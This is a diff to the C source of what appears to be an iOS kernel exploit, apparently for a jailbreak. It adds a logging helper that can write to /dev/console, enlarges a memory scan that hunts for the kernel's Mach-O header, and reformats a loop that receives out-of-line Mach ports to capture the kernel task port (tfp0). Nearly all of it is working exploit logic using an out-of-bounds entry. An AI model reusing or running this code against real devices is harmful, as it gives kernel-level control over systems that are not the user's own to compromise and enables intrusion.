@@ -4,6 +4,37 @@
 
 kinfo_t *kinfo = NULL;
 
+void print_log(const char *fmt, ...) {
+    static bool log_opened = false;
+    if (!log_opened) {
+        openlog("oob_entry", LOG_PID | LOG_CONS, LOG_USER);
+        log_opened = true;
+    }
+
+    char buf[1024];
+    va_list va;
+    va_start(va, fmt);
+    vsnprintf(buf, sizeof(buf), fmt, va);
+    va_end(va);
+    syslog(LOG_ERR, "%s", buf);
+    fprintf(stderr, "%s", buf);
+    fflush(stderr);
+#ifdef UNTETHER
+    static int console_fd = -1;
+    if (console_fd < 0) {
+        console_fd = open("/dev/console", O_WRONLY | O_NOCTTY);
+    }
+
+    if (console_fd >= 0) {
+        write(console_fd, buf, strlen(buf));
+        if (buf[strlen(buf) - 1] != '\n') {
+            write(console_fd, "\n", 1);
+        }
+        fsync(console_fd);
+    }
+#endif
+}
+
 int create_oob_entry(void) {
     uint64_t oob_size = 0xffffffffffffc000;
     uint64_t oob_offset = 0xffffffff00008000;
@@ -187,9 +218,8 @@ int run_exploit(void) {
     if (create_oob_entry() != 0) goto done;
     print_log("[*] main_entry: 0x%x\n", kinfo->main_entry);
     print_log("[*] oob_entry: 0x%x\n", kinfo->oob_entry);
-
-    uint8_t *mapped = map_relative_data(0, 0x1000000, VM_PROT_READ);
-    for (uint32_t i = 0; i < 0x1000000; i+=0x1000) {
+    uint8_t *mapped = map_relative_data(0, 0x10000000, VM_PROT_READ);
+    for (uint32_t i = 0; i < 0x10000000; i+=0x1000) {
         if (*(uint32_t *)(mapped + i) == MH_MAGIC && *(uint32_t *)(mapped + i + 0xc) == MH_EXECUTE) {
             kinfo->mapping_base = kinfo->kernel_phys_base - i;
             kinfo->kernel_base = *(uint32_t *)(mapped + i + 0x34);
@@ -200,7 +230,7 @@ int run_exploit(void) {
         }
     }
 
-    unmap_data(mapped, 0x1000000);
+    unmap_data(mapped, 0x10000000);
     if (kinfo->mapping_base == 0) goto done;
     print_log("[*] mapping_base: 0x%x\n", kinfo->mapping_base);
     print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
@@ -228,15 +258,15 @@ int run_exploit(void) {
 
     ool_msg_t *msg = calloc(1, 0x1000);
     for (uint32_t i = 0; i < OOL_COUNT; i++) {
-         bzero(msg, 0x1000);
-         mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, ool_port, 0, 0);
+        bzero(msg, 0x1000);
+        mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, ool_port, 0, 0);
 
-         mach_port_t *received = msg->ool_ports.address;
-         if (received != NULL && received[3] != mach_task_self()) {
-             kinfo->tfp0 = received[3];
-             break;
-         }
-     }
+        mach_port_t *received = msg->ool_ports.address;
+        if (received != NULL && received[3] != mach_task_self()) {
+            kinfo->tfp0 = received[3];
+            break;
+        }
+    }
 
     mach_port_deallocate(mach_task_self(), ool_port);
     free(msg);
